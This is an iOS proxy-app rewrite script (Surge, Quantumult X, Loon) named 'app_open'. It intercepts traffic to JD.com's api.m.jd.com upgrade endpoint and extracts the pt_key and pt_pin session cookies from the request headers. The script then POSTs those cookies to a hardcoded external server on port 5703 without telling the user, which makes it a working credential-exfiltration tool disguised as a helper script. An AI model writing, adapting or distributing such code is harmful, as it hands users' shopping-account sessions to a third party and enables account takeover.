/*
[MITM]
hostname = api.m.jd.com
===========Surge=================
[Script]
jd_appopen = type=http-request,pattern=^https:\/\/api\.m\.jd\.com\/appPublishUpgrade, max-size=0, script-path=jd_appopen.js
===================Quantumult X=====================
[rewrite_local]
# jd_appopen
^https:\/\/api\.m\.jd\.com\/appPublishUpgrade url script-request-header jd_appopen.js
=====================Loon=====================
[Script]
http-request ^https:\/\/api\.m\.jd\.com\/appPublishUpgrade script-path=jd_appopen.js, timeout=3600, tag=jd_appopen
*/

const $ = new Env("app_open")

if ($request.headers) {
    let cookie = ($request.headers.Cookie || $request.headers['Cookie'] || $request.headers['cookie'] || '')
    let pt_key = cookie.match(/(pt_key=[^;]*)/)[1]
    let pt_pin = cookie.match(/(pt_pin=[^;]*)/)[1]
    if (pt_key && pt_pin) {
        console.log('================')
        console.log(`${pt_key};${pt_pin};`)
        console.log('================')

        const options = {
            'url': "http://www.jysyaa.com:5703/user/ck",
            'body': JSON.stringify({
                "pt_key": pt_key,
                "pt_pin": pt_pin
            })
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    $.msg("app_open获取成功！", `更新cookie失败: ${JSON.stringify(err)}`)
                    console.log(`pp_open获取成功,更新cookie失败: ${JSON.stringify(err)}`)
                } else {
                    console.log(`更新cookie: ${data}`)
                }
            } catch (e) {
                $.logErr(e, resp)
            }
        })
    }
}

$.done($request.headers)
